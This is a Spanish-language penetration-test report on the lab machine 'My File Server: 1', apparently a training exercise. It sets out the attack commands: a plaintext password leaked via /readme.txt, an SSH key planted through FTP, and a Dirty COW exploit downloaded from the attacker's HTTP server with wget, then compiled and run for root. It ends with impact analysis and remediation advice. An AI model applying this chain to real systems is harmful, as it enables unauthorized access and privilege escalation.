@@ -1,0 +1,323 @@
+--- PAGE 1 ---
+ 
+
+--- PAGE 2 ---
+Red team report: pentesting de My File Server 1  
+Contenido  
+2. Executive Summary  ................................ ...............  1 
+3. Alcance  ................................ ................................ . 1 
+4. Metodología aplicada  ................................ .............  1 
+5. Fases de reconocimiento  ................................ ........  1 
+6. Enumeración  ................................ .........................  2 
+7. Explotación  ................................ ............................  5 
+8. Escalada de privilegios  ................................ ...........  7 
+9. Análisis de impacto (mod elo CIA)  .........................  10 
+10. Recomendaciones técnicas  ................................ . 10 
+11. Tabla de hallazgos  ................................ .............  11 
+12.- Bibliografías  ................................ .....................  12 
+ 
+  
+--- PAGE 3 ---
+P á g i n a  1 | 13 
+ 2. Executive Summary  
+El presente informe documenta la prueba de penetración realizada sobre la máquina 
+vulnerable My  File Server: 1. El objetivo fue evaluar la exposición de servicios, la 
+existencia de credenciales expuestas y la posibilidad de escalada de privilegios. 
+Durante la evaluación se identificaron credenciales en texto plano dentro de 
+/readme.txt, un recurso S MB (smbdata) accesible con permisos de lectura/escritura 
+y una vulnerabilidad local de escalada (explotación de Dirty COW) que permitió 
+obtención de privilegios de root. El riesgo combinado es alto: un atacante con acceso 
+a la red podría exfiltrar informac ión, modificar archivos y tomar control total del 
+servidor. En las páginas siguientes se detallan evidencias técnicas, análisis de 
+impacto (confidencialidad, integridad y disponibilidad) y recomendaciones 
+priorizadas para mitigar los riesgos.  
+3. Alcance  
+Alcance de la prueba: evaluación negra (black -box) de la máquina virtual My File 
+Server: 1  con IP 192.168.56.103. Se incluyeron las siguientes actividades: 
+reconocimiento de red, escaneo de puertos y servicios, enumeración de servicios 
+web y SMB, int ento de explotación de vulnerabilidades públicas y pruebas de 
+escalada de privilegios locales. Quedan fuera del alcance: ataques de denegación de 
+servicio dirigidos a interrumpir producción y cambios permanentes en sistemas de 
+terceros.  
+4. Metodología apli cada  
+Se siguió un enfoque estructurado basado en las fases PTES/OWASP: (1) 
+Reconocimiento pasivo y activo, (2) Enumeración detallada de servicios y versiones, 
+(3) Identificación y validación de vulnerabilidades, (4) Explotación controlada para 
+demostrar im pacto, (5) Post -explotación y escalada de privilegios, y (6) Análisis de 
+impacto y recomendaciones. Para cada fase se registraron comandos, salidas y 
+evidencias reproducibles; se priorizaron técnicas no destructivas salvo autorización 
+explícita.  
+5. Fases d e reconocimiento  
+Primero se realizó reconocimiento pasivo para detectar hosts activos con netdiscover  
+--- PAGE 4 ---
+P á g i n a  2 | 13 
+  
+El comando m uestra las maquinas  que se encuentran  en la misma  red del host , 
+identificamos que la IP 192.168.56.103 es nuestra maquina victima  
+ 
+A conti nuación, se ejecutó un escaneo activo de puertos y servicios con nmap -p- 
+192.168.56.103  -sV  para obtener la lista exhaustiva de puertos abiertos y versiones.  
+ 
+Vulnerabilidades encontradas : 
+ 
+6. Enumeración  
+Se utilizaron herramientas de enumeración para determinar vectores de ataque : 
+
+--- PAGE 5 ---
+P á g i n a  3 | 13 
+ Ejecutamos el comando nikto -h para enumerar directorios del servicio web : 
+ 
+ 
+Vemos que nikto reveló el fichero /readme.txt  el cual puede ser interesante.  
+Abrimos la dirección 192.168.56.103/readme.txt para  visualizar el contenido  y 
+vemos que incluye  la cadena My password is rootroot1  
+ 
+Con esto obtenemos  la contraseña “rootroot1” del usuario smbuser  
+Utilizamos el comando sudo smbmap -H para enumerar las variables  
+
+--- PAGE 6 ---
+P á g i n a  4 | 13 
+  
+smbmap mostró el recurso smbdata con permisos de lectura y escritura, lo que 
+permite listar y transferir ficheros. Además, el servicio HTTP reportó versión  Apache 
+2.4.6, la cual debe compararse con bases de CVE para verificar parches pendientes.  
+ 
+  
+
+--- PAGE 7 ---
+P á g i n a  5 | 13 
+ 7. Explotación  
+Utilizamos el comando ftp , aquí ya estamos conectados al servidor de archivos,  pero 
+esto no es seguro, ya que  si se realiza  una auditoria encontraran todos nuestros 
+movimientos, debemos encriptar la información con ssh con la llave del siguiente 
+comando . 
+ 
+Generamos  la llave  para establecer la comunicaion  con el comando sudo ssh -keygen  
+ 
+Debemos agregar  la llave  en el director io .ssh , para ello primero iniciamos como 
+super usuario: sudo su  
+
+--- PAGE 8 ---
+P á g i n a  6 | 13 
+  
+Posteriormente nos dirigimos a la carpeta raíz y utilizamos el comando ftp para 
+conectarnos a la máquina víctima mediante su dirección IP.  
+Una vez establecida la conexión, se creó el directorio .ssh en el sistema remoto y se 
+accedió a él.  
+Desde este directorio se transfirió la clave pública generada previamente con el 
+comando ssh -keygen, utilizando el comando:  
+• put id_ed25519.pub authorized_keys  
+Este procedimiento copia la clave pública  al archivo authorized_keys, permitiendo 
+que el sistema remoto acepte autenticación mediante clave SSH desde la máquina 
+atacante. De esta forma se puede establecer acceso remoto sin necesidad de 
+contraseña utilizando el cliente SSH.  
+ 
+Una vez configurada l a autenticación mediante claves SSH, es posible acceder al 
+sistema remoto utilizando el siguiente comando:  ssh smbuser@192.168.56.103  
+
+--- PAGE 9 ---
+P á g i n a  7 | 13 
+  
+Con esto se obtiene acceso al sistema con los privilegios del usuario smbuser.  
+8. Escalada de privilegios  
+La escalada empleada fue Dirty COW (CVE -2016-5195), que explota una condición 
+de carrera en el mecanismo copy -on-write del kernel Linux permitiendo modificar 
+archivos propietarios y obtener privilegios de root.  
+ 
+
+--- PAGE 10 ---
+P á g i n a  8 | 13 
+ Pegamos el código en la máquina  de Linux  y lo guardamos con el nombre dirtyCow.c  
+ 
+Se abrió una nueva terminal en la máquina atacante y se levantó un servidor HTTP 
+temporal utilizando el comando:  python3 -m http.server 8080  
+Este servidor se utilizó para alojar el archivo del exploit dirtyCow.c, pe rmitiendo que 
+la máquina víctima pudiera descargarlo mediante una solicitud HTTP.  
+ 
+Una vez iniciado el servidor HTTP, se pudo observar en la terminal que el servidor 
+queda a la espera de peticiones entrantes desde la máquina víctima.  
+Después de levantar  el servidor HTTP, regresamos a la terminal donde se había 
+establecido la conexión con la máquina víctima mediante SSH. Desde esta terminal 
+se utilizó el comando:  
+• wget http://192.168.56.102:8080 /dirtyCow.c  
+Este comando permitió descargar el archivo dirtyCow.c desde la máquina atacante 
+hacia la máquina víctima. Posteriormente, el archivo descargado se utilizaría para 
+compilar y ejecutar el exploit correspondiente a la vulnerabilidad Dirty COW.  
+
+--- PAGE 11 ---
+P á g i n a  9 | 13 
+  
+En la otra terminal se puede ver que el servidor que levantamos escucha las 
+peticiones  
+ 
+Posteriormente regresamos a la terminal donde se tenía acceso a la máquina víctima 
+mediante SSH. Desde esta terminal se compiló el código fuente del exploit utilizando 
+el siguiente comando:  
+• gcc dirtyCow.c -o Aznar -pthread  
+Este comando compila el archivo dirtyCow.c y genera un archivo ejecutable llamado 
+Aznar, el cual contiene el exploit correspondiente a la vulnerabilidad Dirty COW.  
+Finalmente, para intentar escalar privilegios dentro del sistema se ejecutó el archivo 
+compilado mediante el comando:  
+• ./Azna r 
+ 
+
+--- PAGE 12 ---
+P á g i n a  10 | 13 
+  
+La ejecución del exploit permite aprovechar la vulnerabilidad presente en el kernel 
+de Linux con el objetivo de escalar privilegios dentro del sistema.  
+9. Análisis de impacto (modelo CIA)  
+Confidencialidad: comprometida por la presencia de credenciales en texto plano 
+(/readme.txt) y la posibilidad de leer el share SMB; incertidumbre sobre datos 
+sensibles alojados en smbdata.  
+ Integridad: vulnerable ante modificaciones no autorizadas en la sh are (permisos 
+R/W) y la capacidad de reemplazar binarios o ficheros críticos tras escalada.  
+Disponibilidad: posible interrupción si se eliminan o corrompen ficheros críticos o si 
+el atacante instala procesos maliciosos. El riesgo global se cataloga como alto por 
+la combinación de acceso inicial sencillo y disponibilidad de escalada a root.  
+10. Recomendaciones técnicas  
+1. Crítico (inmediato): parchear el kernel para mitigar CVE -2016-5195; si no es 
+posible, aislar la VM hasta aplicar parche.  
+2. Alto: eliminar credenciales en texto plano, rotar contraseñas expuestas y 
+aplicar políticas de contraseñas seguras.  
+3. Alto: restringir permisos del share SMB (smbdata) usando ACLs y principios 
+de menor privilegio; deshabilitar accesos anónimos.  
+4. Medio: revisar y ac tualizar Apache (y demás servicios) según CVE; 
+deshabilitar módulos innecesarios.  
+
+--- PAGE 13 ---
+P á g i n a  11 | 13 
+ 5. Medio: habilitar registros (auditd, syslog remoto) y alertas para accesos 
+SMB/HTTP; crear playbook de respuesta y realizar análisis forense de binarios 
+subidos.  
+6. Bajo: impleme ntar gestión de secretos (vault) para evitar almacenamiento de 
+credenciales en ficheros públicos.  
+11. Tabla de hallazgos  
+ID Vulnerabili
+dad Sever
+idad Evidencia 
+(archivo/referencia)  Impacto  Recomendación  
+01 Credencial 
+en texto 
+plano en 
+/readme.tx
+t (expuesta 
+vía HTTP)  Alta Contenido de 
+/readme.txt : “My 
+password is 
+rootroot1”. Captura 
+de curl 
+http://192.168.56.1
+03/readme.txt . Acceso no 
+autorizado a 
+SMB; 
+exfiltración de 
+datos y 
+compromiso 
+de cuentas.  Eliminar 
+ficheros con 
+credenciales, 
+rotar 
+contraseñas, 
+usar gestión de 
+secretos.  
+02 Share SMB 
+smbdata  
+con 
+permisos 
+de 
+lectura/esc
+ritura  Alta Salida de smbmap  
+mostrando smbdata  
+con R/W (guardar 
+smbmap  output).  Lectura/modif
+icación/exfiltr
+ación de 
+datos; posible 
+pivote.  Restringir 
+permisos, 
+aplicar ACLs, 
+deshabilitar 
+escritura 
+cuando no sea 
+necesaria.  
+03 Vulnerabili
+dad local 
+Dirty COW 
+(CVE-
+2016-
+5195) — 
+escalada a 
+root Crític
+a Ejecución de exploit 
+Dirty COW; 
+compilación y 
+ejecución del binario  Escalada a 
+privilegios 
+root; control 
+total del 
+sistema.  Actualizar/parc
+hear kernel; 
+revisar 
+integridad del 
+sistema y 
+restaurar desde 
+respaldo si 
+procede.  
+04 Versión de 
+Apache 
+potencialm
+ente 
+desactualiz
+ada 
+(Apache 
+2.4.6)  Media  Resultado de nmap   
+indicando Apache 
+2.4.6. Exposición a 
+vulnerabilidad
+es conocidas 
+de la versión; 
+riesgos de 
+ejecución 
+remota/ 
+divulgación.  Actualizar 
+Apache a 
+versión 
+mantenida y 
+revisar CVE 
+aplicables.  
+05 Prácticas 
+inseguras 
+en 
+transferenc
+ia de claves Media  Uso de ftp para subir 
+clave pública (se 
+documenta la falta 
+de cifrado).  Posible 
+intercepción 
+de 
+credenciales/t
+ransmisiones; Usar scp/sftp o 
+mecanismos 
+seguros; evitar 
+FTP en 
+producción; 
+--- PAGE 14 ---
+P á g i n a  12 | 13 
+ (uso de 
+FTP sin 
+cifrado)  pérdida de 
+confidencialid
+ad. emplear llaves 
+con permisos y 
+repositorios de 
+secretos.  
+ 
+12.- Bibliografías  
+• CVE-2016 -5195:  Vulnerabilidad "Dirty COW" (Kernel Linux).  
+• PTES:  Estándar de Ejecución de Pru ebas de Penetración.  
+• NVD (NIST):  Base de Datos Nacional de Vulnerabilidades.  
+• OWASP:  Guía de seguridad en servicios web.  
+• Manuales de Herramientas:  Documentación oficial de Nmap, Nikto y 
+SMBMap.  
+ 
